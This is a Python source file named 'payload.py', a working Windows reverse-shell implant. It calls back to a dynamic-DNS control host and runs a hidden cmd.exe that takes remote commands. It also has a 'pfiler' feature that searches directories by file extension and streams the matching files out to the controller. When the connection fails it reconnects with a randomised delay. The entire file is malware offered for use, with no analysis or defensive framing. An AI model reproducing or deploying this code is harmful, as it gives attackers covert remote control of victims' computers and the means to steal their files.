# payload.py
# The Heartbeat Soul - PFILER Protocol and Persistent CMD State

import os
import sys
import time
import random
import socket
import subprocess
from threading import Thread
import hashlib
import base64

# --- DYNAMIC CONFIG (Replace ##RPORT## with your port) ---
RHOST = "pong-control.ddns.net"
RPORT = ##RPORT##
# ----------------------

def find_files(start_dir, extensions_str):
    """Recursively finds files with specified extensions for the pfiler command."""
    files_to_transfer = []
    extensions = {ext.strip().lower() for ext in extensions_str.split(',') if ext.strip()}
    
    if not os.path.isdir(start_dir):
        return files_to_transfer

    for root, _, files in os.walk(start_dir):
        for file in files:
            if '.' in file:
                file_ext = file.split('.')[-1].lower()
                if file_ext in extensions:
                    files_to_transfer.append(os.path.join(root, file))
    return files_to_transfer

def handle_pfiler(s_obj, command_line):
    """Handles the pfiler command and transfers files reliably."""
    parts = command_line.split(' ', 2)
    if len(parts) != 3:
        s_obj.sendall(b"\n[PFILER ERROR] Usage: pfiler <directory> <ext1,ext2,...>\n")
        return

    start_dir = parts[1].strip()
    extensions_str = parts[2].strip()
    
    s_obj.sendall(f"\n[PFILER STATUS] Searching for files with extensions '{extensions_str}' in '{start_dir}'...\n".encode('utf-8'))
    
    files = find_files(start_dir, extensions_str)
    
    if not files:
        s_obj.sendall(b"\n[PFILER STATUS] No files found matching criteria. Aborting transfer.\n")
        return

    s_obj.sendall(f"\n[PFILER START] Total files to transfer: {len(files)}\n".encode('utf-8'))

    # Reliable block-by-block transfer for each file
    for filepath in files:
        try:
            file_size = os.path.getsize(filepath)
            
            # 1. Calculate SHA256 Checksum
            sha256_hash = hashlib.sha256()
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk: break
                    sha256_hash.update(chunk)
            file_hash = sha256_hash.hexdigest()

            # 2. Send File Metadata
            b64_filepath = base64.b64encode(filepath.encode('utf-8')).decode('utf-8')
            metadata = f"[FILE_START] {b64_filepath}|{file_size}|{file_hash}\n"
            s_obj.sendall(metadata.encode('utf-8'))
            s_obj.sendall(f"[PFILER STATUS] Transferring: {filepath} ({file_size} bytes)\n".encode('utf-8'))

            # 3. Send Binary Content (The core transfer)
            with open(filepath, 'rb') as f:
                f.seek(0)
                while True:
                    chunk = f.read(4096)
                    if not chunk: break
                    s_obj.sendall(chunk)
            
            # 4. Send File End Marker
            s_obj.sendall(f"\n[FILE_END] {b64_filepath}\n".encode('utf-8'))
            
        except Exception as e:
            s_obj.sendall(f"\n[PFILER ERROR] Failed to transfer {filepath}: {str(e)}\n".encode('utf-8'))
            continue

    s_obj.sendall(b"\n[PFILER END] All specified file transfers complete.\n")

def run_conduit():
    """The main reverse shell loop."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            CREATE_NO_WINDOW = 0x08000000
            # THIS POPEN MAINTAINS THE CMD PROCESS STATE (CWD)
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            def p_in():
                buffer = b''
                while True:
                    try:
                        chunk = s_obj.recv(4096)
                        if not chunk: break
                        
                        buffer += chunk

                        if b'\n' in buffer:
                            lines = buffer.splitlines(True) 
                            buffer = b'' 

                            for line in lines:
                                if line.endswith(b'\n') or line.endswith(b'\r\n'):
                                    command_line = line.decode('utf-8').strip()
                                    
                                    # Intercept pfiler
                                    if command_line.upper().startswith('PFILER'):
                                        handle_pfiler(s_obj, command_line)
                                    else:
                                        # Pass all other commands (cd, dir, whoami) to the persistent cmd process
                                        p.stdin.write(line);p.stdin.flush()
                                else:
                                    buffer = line 
                        elif buffer and len(buffer) > 4096 * 10: 
                             p.stdin.write(buffer);p.stdin.flush()
                             buffer = b''

                    except Exception: break
                s_obj.close()
            
            def p_out():
                while True:
                    try:
                        # Output includes the new CMD PROMPT/PATH
                        d=os.read(p.stdout.fileno(), 4096);
                        if not d: break;
                        s_obj.sendall(d)
                    except: break
                s_obj.close()
            def p_err():
                while True:
                    try:
                        d=os.read(p.stderr.fileno(), 4096);
                        if not d: break;
                        s_obj.sendall(d)
                    except: break
                s_obj.close()

            Thread(target=p_in, daemon=True).start()
            Thread(target=p_out, daemon=True).start()
            Thread(target=p_err, daemon=True).start()
            p.wait()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()